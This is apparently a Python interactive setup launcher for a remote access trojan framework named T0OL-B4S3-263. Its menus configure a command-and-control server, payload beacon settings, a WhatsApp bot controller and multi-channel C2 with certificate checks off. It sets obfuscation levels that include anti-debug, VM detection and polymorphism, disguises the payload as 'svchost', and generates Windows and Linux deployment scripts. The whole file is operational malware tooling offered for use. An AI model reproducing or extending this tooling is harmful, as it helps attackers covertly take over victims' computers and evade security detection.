#!/usr/bin/env python3
"""
T0OL-B4S3-263 INTEGRATED SETUP LAUNCHER
Combines setup_master.py and setup_advanced.py for complete project configuration
"""

import sys
import os
from pathlib import Path
from typing import Dict, List

# Import our setup modules
sys.path.insert(0, str(Path(__file__).parent))

try:
    from setup_master import MasterSetup, TerminalStyle, InteractivePrompt
    from setup_advanced import (
        SessionDatabase, MultiChannelC2Config, ObfuscationConfig,
        PayloadCustomization, ConnectivityTester, DeploymentHelper,
        CommandTemplates
    )
except ImportError as e:
    print(f"Error importing setup modules: {e}")
    sys.exit(1)


class IntegratedSetupLauncher:
    """Main launcher integrating all setup components"""
    
    def __init__(self):
        self.style = TerminalStyle()
        self.prompt = InteractivePrompt()
        self.config = {}
        self.db = None
        
    def display_banner(self):
        """Display beautiful startup banner"""
        banner = """
        ╔══════════════════════════════════════════════════════════════════╗
        ║                   T0OL-B4S3-263 Setup Launcher                    ║
        ║                  Integrated Configuration System                  ║
        ║                                                                  ║
        ║  Advanced RAT Framework with Multi-Channel C2 & Obfuscation      ║
        ╚══════════════════════════════════════════════════════════════════╝
        """
        print(self.style.color(banner, 'bright_cyan'))
    
    def main_menu(self) -> str:
        """Display main menu"""
        print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
        print(self.style.bold("║       T0OL-B4S3-263 SETUP LAUNCHER       ║"))
        print(self.style.bold("╚════════════════════════════════════════╝"))
        
        color_map = {
            'blue': 'bright_blue',
            'green': 'bright_green',
            'yellow': 'bright_yellow',
            'magenta': 'bright_magenta',
            'cyan': 'bright_cyan',
            'red': 'bright_red',
            'white': 'white'
        }
        
        options = [
            ("1", "Quick Setup (All Components)", "blue"),
            ("2", "Basic Configuration Only", "green"),
            ("3", "Advanced C2 Configuration", "yellow"),
            ("4", "Payload Obfuscation Setup", "magenta"),
            ("5", "Database Initialization", "cyan"),
            ("6", "Install Dependencies", "bright_magenta"),
            ("7", "Deploy & Test", "red"),
            ("8", "View Configuration Summary", "white"),
            ("9", "Exit", "white")
        ]
        
        for key, label, color in options:
            colored_label = self.style.color(label, color_map.get(color, 'white'))
            print(f"  {key}. {colored_label}")
        
        choice = input("\n" + self.style.color("Select option: ", 'bright_cyan')).strip()
        return choice
    
    def setup_basic(self):
        """Run basic configuration"""
        print("\n" + self.style.color("Starting Basic Configuration Setup...", 'bright_yellow'))
        
        print("\n" + self.style.bold("═" * 50))
        print(self.style.bold("C2 SERVER CONFIGURATION"))
        print(self.style.bold("═" * 50))
        
        c2_host = self.prompt.prompt_text(
            "C2 Server Host",
            default="0.0.0.0"
        )
        c2_port = self.prompt.prompt_text(
            "C2 Server Port",
            default="5000"
        )
        
        self.config['c2'] = {
            'host': c2_host,
            'port': int(c2_port)
        }
        
        print("\n" + self.style.bold("═" * 50))
        print(self.style.bold("PAYLOAD CONFIGURATION"))
        print(self.style.bold("═" * 50))
        
        target_host = self.prompt.prompt_text(
            "Target C2 Host (what payload connects to)",
            default=c2_host
        )
        target_port = self.prompt.prompt_text(
            "Target C2 Port",
            default=c2_port
        )
        
        self.config['payload'] = {
            'c2Host': target_host,
            'c2Port': int(target_port),
            'beaconInterval': 30
        }
        
        print("\n" + self.style.bold("═" * 50))
        print(self.style.bold("WHATSAPP BOT CONFIGURATION"))
        print(self.style.bold("═" * 50))
        
        admin_number = self.prompt.prompt_text(
            "Administrator Phone Number",
            default="+1234567890"
        )
        
        self.config['whatsapp'] = {
            'adminNumber': admin_number,
            'c2Host': c2_host,
            'c2Port': int(c2_port)
        }
        
        print("\n" + self.style.color("✓ Basic configuration complete!", 'bright_green'))
    
    def setup_advanced_c2(self):
        """Setup multi-channel C2"""
        print("\n" + self.style.color("Advanced C2 Configuration", 'bright_yellow'))
        
        mc2 = MultiChannelC2Config()
        
        print("\nAvailable channels:")
        for ch_name, ch_info in mc2.AVAILABLE_CHANNELS.items():
            status = self.style.color("●", 'bright_green') if ch_name == 'https_direct' else self.style.color("●", 'bright_red')
            print(f"  {status} {ch_name}: {ch_info['name']}")
            print(f"     {ch_info['description']}")
            print(f"     Risk: {ch_info['detection_risk']}, Speed: {ch_info['speed']}\n")
        
        primary = self.prompt.prompt_choice(
            "Primary channel",
            {k: v['name'] for k, v in mc2.AVAILABLE_CHANNELS.items()},
            default=list(mc2.AVAILABLE_CHANNELS.keys())[0]
        )
        mc2.config['primary'] = primary
        
        print("\nConfigure HTTPS Direct channel:")
        https_host = self.prompt.prompt_text("HTTPS Host", default="192.168.1.201")
        https_port = self.prompt.prompt_text("HTTPS Port", default="4444")
        
        mc2.configure_channel('https_direct', {
            'host': https_host,
            'port': int(https_port),
            'use_ssl': True,
            'certificate_validation': False
        })
        
        print("\n" + self.style.color("✓ Multi-channel C2 configured!", 'bright_green'))
        self.config['c2_advanced'] = mc2.get_config()
    
    def setup_obfuscation(self):
        """Setup payload obfuscation"""
        print("\n" + self.style.color("Payload Obfuscation Configuration", 'bright_yellow'))
        
        obf = ObfuscationConfig()
        
        print("\nObfuscation Levels:")
        print("  1. Minimal   - Only string encoding")
        print("  2. Normal    - String + control flow + debug checks")
        print("  3. Aggressive- Add dead code, VM checks, polymorphism")
        print("  4. Maximum   - All techniques enabled")
        
        levels = ['minimal', 'normal', 'aggressive', 'maximum']
        level_dict = {i: l.capitalize() for i, l in enumerate(levels)}
        choice = self.prompt.prompt_choice(
            "Select obfuscation level",
            level_dict,
            default=1
        )
        
        obf.set_level(levels[int(choice)])
        
        print("\n" + self.style.color("Payload Appearance:", 'bold'))
        fake_name = self.prompt.prompt_text(
            "Fake executable name (no extension)",
            default="svchost"
        )
        
        custom = PayloadCustomization()
        custom.config['name'] = fake_name
        
        print("\n" + self.style.color("✓ Obfuscation configured!", 'bright_green'))
        self.config['obfuscation'] = obf.config
        self.config['payload_custom'] = custom.get_config()
    
    def init_database(self):
        """Initialize SQLite database"""
        print("\n" + self.style.color("Initializing Session Database...", 'bright_yellow'))
        
        db_path = self.prompt.prompt_text(
            "Database path",
            default="sessions.db"
        )
        
        try:
            self.db = SessionDatabase(db_path)
            print(self.style.color(f"✓ Database initialized at {db_path}", 'bright_green'))
            self.config['database'] = {'path': db_path}
        except Exception as e:
            print(self.style.color(f"✗ Database initialization failed: {e}", 'bright_red'))
    
    def deploy_and_test(self):
        """Deploy and test configuration"""
        print("\n" + self.style.color("Deployment & Testing", 'bright_yellow'))
        
        if not self.config:
            print(self.style.color("No configuration loaded! Run Basic Setup first.", 'bright_red'))
            return
        
        if 'c2' in self.config:
            print(f"\nTesting C2 connectivity to {self.config['c2']['host']}:{self.config['c2']['port']}...")
            
            tester = ConnectivityTester(
                self.config['c2']['host'],
                self.config['c2']['port']
            )
            
            results = tester.run_all_tests()
            
            dns_ok = self.style.color("✓", 'bright_green') if results.get('dns_resolution') else self.style.color("✗", 'bright_red')
            c2_ok = self.style.color("✓", 'bright_green') if results.get('c2_connectivity') else self.style.color("✗", 'bright_red')
            
            print(f"  DNS Resolution: {dns_ok}")
            print(f"  C2 Connectivity: {c2_ok}")
        
        if self.config:
            print("\nGenerating deployment scripts...")
            deployer = DeploymentHelper(Path.cwd())
            
            ps_script = deployer.generate_deployment_script(self.config)
            bash_script = deployer.generate_bash_deployment(self.config)
            
            with open('deploy_windows.ps1', 'w') as f:
                f.write(ps_script)
            print(self.style.color("✓ Generated deploy_windows.ps1", 'bright_green'))
            
            with open('deploy_linux.sh', 'w') as f:
                f.write(bash_script)
            print(self.style.color("✓ Generated deploy_linux.sh", 'bright_green'))
    
    def install_dependencies(self):
        """Install project dependencies with sub-menu"""
        while True:
            print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
            print(self.style.bold("║     DEPENDENCY INSTALLATION MANAGER      ║"))
            print(self.style.bold("╚════════════════════════════════════════╝"))
            
            print("\n📦 Available Components to Install:\n")
            options = [
                ("1", "Python Dependencies (requirements.txt)", "bright_cyan"),
                ("2", "Node.js Dependencies (npm)", "bright_yellow"),
                ("3", "Install All", "bright_green"),
                ("4", "View Installed Packages", "bright_blue"),
                ("5", "Back to Main Menu", "white")
            ]
            
            for key, label, color in options:
                colored_label = self.style.color(label, color)
                print(f"  {key}. {colored_label}")
            
            choice = input("\n" + self.style.color("Select option: ", 'bright_cyan')).strip()
            
            if choice == "1":
                self.install_python_deps()
                self.display_installation_status()
            elif choice == "2":
                self.install_node_deps()
                self.display_installation_status()
            elif choice == "3":
                self.install_python_deps()
                self.install_node_deps()
                self.display_installation_status()
            elif choice == "4":
                self.display_installation_status()
            elif choice == "5":
                break
            else:
                print(self.style.color("❌ Invalid option!", 'bright_red'))
    
    def install_python_deps(self):
        """Install Python dependencies from requirements.txt"""
        print("\n" + self.style.color("↓ Installing Python dependencies...", 'bright_yellow'))
        
        req_file = Path.cwd() / 'requirements.txt'
        if not req_file.exists():
            print(self.style.color(f"✗ requirements.txt not found at {req_file}", 'bright_red'))
            return False
        
        try:
            import subprocess
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'install', '-r', str(req_file)],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            if result.returncode == 0:
                print(self.style.color("✓ Python dependencies installed successfully", 'bright_green'))
                
                # Show summary
                with open(req_file, 'r') as f:
                    packages = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
                print(self.style.color(f"\n📊 Installed {len(packages)} packages:", 'bright_cyan'))
                for pkg in packages[:10]:  # Show first 10
                    print(f"   • {self.style.color(pkg, 'bright_green')}")
                if len(packages) > 10:
                    print(f"   • {self.style.color(f'... and {len(packages)-10} more', 'bright_green')}")
                
                return True
            else:
                print(self.style.color(f"✗ Installation failed: {result.stderr}", 'bright_red'))
                return False
        except Exception as e:
            print(self.style.color(f"✗ Error: {str(e)}", 'bright_red'))
            return False
    
    def install_node_deps(self):
        """Install Node.js dependencies with npm"""
        print("\n" + self.style.color("↓ Installing Node.js dependencies...", 'bright_yellow'))
        
        # Check if npm is available
        try:
            import subprocess
            result = subprocess.run(
                ['npm', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode != 0:
                print(self.style.color("⚠ npm not found. Install Node.js first.", 'bright_yellow'))
                return False
            
            npm_version = result.stdout.strip()
            print(self.style.color(f"✓ Found npm {npm_version}", 'bright_green'))
            
            # Check for package.json
            pkg_json = Path.cwd() / 'package.json'
            if not pkg_json.exists():
                print(self.style.color(f"⚠ package.json not found at {pkg_json}", 'bright_yellow'))
                return False
            
            # Run npm install
            result = subprocess.run(
                ['npm', 'install'],
                capture_output=True,
                text=True,
                timeout=300,
                cwd=str(Path.cwd())
            )
            
            if result.returncode == 0:
                print(self.style.color("✓ Node.js dependencies installed successfully", 'bright_green'))
                
                # Parse package.json to show dependencies
                try:
                    import json
                    with open(pkg_json, 'r') as f:
                        pkg_data = json.load(f)
                    
                    deps = pkg_data.get('dependencies', {})
                    dev_deps = pkg_data.get('devDependencies', {})
                    
                    print(self.style.color(f"\n📊 Installed Dependencies:", 'bright_cyan'))
                    print(self.style.color(f"   Production: {len(deps)} packages", 'bright_green'))
                    print(self.style.color(f"   Development: {len(dev_deps)} packages", 'bright_green'))
                    
                    if deps:
                        print(self.style.color("\n   Prod Packages:", 'bright_blue'))
                        for pkg in list(deps.keys())[:5]:
                            print(f"   • {self.style.color(pkg, 'bright_green')}")
                        if len(deps) > 5:
                            print(f"   • {self.style.color(f'... and {len(deps)-5} more', 'bright_green')}")
                except Exception as e:
                    print(self.style.color(f"   (Could not parse package.json: {e})", 'bright_yellow'))
                
                return True
            else:
                print(self.style.color(f"✗ Installation failed: {result.stderr}", 'bright_red'))
                return False
                
        except FileNotFoundError:
            print(self.style.color("⚠ npm command not found. Install Node.js and npm first.", 'bright_yellow'))
            return False
        except Exception as e:
            print(self.style.color(f"✗ Error: {str(e)}", 'bright_red'))
            return False
    
    def display_installation_status(self):
        """Display what's currently installed and available"""
        print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
        print(self.style.bold("║     INSTALLATION STATUS REPORT           ║"))
        print(self.style.bold("╚════════════════════════════════════════╝"))
        
        # Python packages status
        print("\n" + self.style.color("📦 Python Environment:", 'bright_cyan'))
        try:
            import subprocess
            result = subprocess.run(
                [sys.executable, '-m', 'pip', 'list'],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')[2:]  # Skip headers
                py_packages = [l.split()[0] for l in lines if l.strip()]
                
                print(self.style.color(f"   ✓ {len(py_packages)} packages installed", 'bright_green'))
                
                # Check for specific required packages
                required = ['colorama', 'cryptography', 'requests', 'flask']
                print("\n   Required Packages:")
                for pkg in required:
                    status = "✓" if any(pkg.lower() in p.lower() for p in py_packages) else "✗"
                    color = 'bright_green' if status == "✓" else 'bright_red'
                    print(f"   {self.style.color(status, color)} {pkg}")
        except Exception as e:
            print(self.style.color(f"   ⚠ Could not check pip list: {e}", 'bright_yellow'))
        
        # Node.js status
        print("\n" + self.style.color("🔧 Node.js Environment:", 'bright_cyan'))
        try:
            import subprocess
            result = subprocess.run(
                ['npm', '--version'],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                npm_ver = result.stdout.strip()
                print(self.style.color(f"   ✓ npm {npm_ver} installed", 'bright_green'))
                
                # Check node_modules
                node_modules = Path.cwd() / 'node_modules'
                if node_modules.exists():
                    pkg_count = len(list(node_modules.iterdir()))
                    print(self.style.color(f"   ✓ {pkg_count} modules installed in node_modules/", 'bright_green'))
                else:
                    print(self.style.color(f"   ✗ node_modules/ not found", 'bright_red'))
            else:
                print(self.style.color(f"   ✗ npm not found", 'bright_red'))
        except FileNotFoundError:
            print(self.style.color(f"   ✗ npm not installed", 'bright_red'))
        except Exception as e:
            print(self.style.color(f"   ⚠ Could not check npm: {e}", 'bright_yellow'))
        
        # Show recently configured
        print("\n" + self.style.color("⚙️  Recently Configured:", 'bright_cyan'))
        if self.config:
            config_items = [
                ('c2', 'C2 Server Configuration'),
                ('payload', 'Payload Configuration'),
                ('obfuscation', 'Obfuscation Settings'),
                ('database', 'Database Configuration')
            ]
            
            for key, label in config_items:
                if key in self.config:
                    print(f"   ✓ {self.style.color(label, 'bright_green')}")
        else:
            print(self.style.color("   (No configuration yet - run setup options first)", 'bright_yellow'))
        
        print("\n" + self.style.bold("═" * 42))
    
    def show_summary(self):
        """Display configuration summary"""
        if not self.config:
            print(self.style.color("No configuration loaded!", 'bright_red'))
            return
        
        print("\n" + self.style.bold("╔════════════════════════════════════════╗"))
        print(self.style.bold("║   CONFIGURATION SUMMARY                  ║"))
        print(self.style.bold("╚════════════════════════════════════════╝"))
        
        print(self.style.color("\n[C2 Server]", 'bright_cyan'))
        if 'c2' in self.config:
            print(f"  Host: {self.style.color(self.config['c2']['host'], 'bright_green')}")
            print(f"  Port: {self.style.color(str(self.config['c2']['port']), 'bright_green')}")
        
        print(self.style.color("\n[Payload]", 'bright_cyan'))
        if 'payload' in self.config:
            print(f"  Target: {self.style.color(self.config['payload']['c2Host'], 'bright_green')}")
            print(f"  Port: {self.style.color(str(self.config['payload']['c2Port']), 'bright_green')}")
            print(f"  Beacon Interval: {self.style.color('30s', 'bright_green')}")
        
        print(self.style.color("\n[Obfuscation]", 'bright_cyan'))
        if 'obfuscation' in self.config:
            print(f"  Level: {self.style.color(self.config['obfuscation']['level'].upper(), 'bright_green')}")
            enabled = len(self.config['obfuscation']['enabled_techniques'])
            print(f"  Techniques: {self.style.color(str(enabled), 'bright_green')}")
        
        print(self.style.color("\n[Database]", 'bright_cyan'))
        if 'database' in self.config:
            print(f"  Path: {self.style.color(self.config['database']['path'], 'bright_green')}")
        
        print("\n" + self.style.bold("═" * 42))
    
    def run(self):
        """Main launcher loop"""
        self.display_banner()
        
        while True:
            choice = self.main_menu()
            
            if choice == "1":
                self.setup_basic()
                self.setup_advanced_c2()
                self.setup_obfuscation()
                self.init_database()
            elif choice == "2":
                self.setup_basic()
            elif choice == "3":
                self.setup_advanced_c2()
            elif choice == "4":
                self.setup_obfuscation()
            elif choice == "5":
                self.init_database()
            elif choice == "6":
                self.install_dependencies()
            elif choice == "7":
                self.deploy_and_test()
            elif choice == "8":
                self.show_summary()
            elif choice == "9":
                print(self.style.color("Exiting T0OL-B4S3-263 Setup Launcher...", 'bright_cyan'))
                sys.exit(0)
            else:
                print(self.style.color("Invalid option!", 'bright_red'))


if __name__ == '__main__':
    launcher = IntegratedSetupLauncher()
    launcher.run()
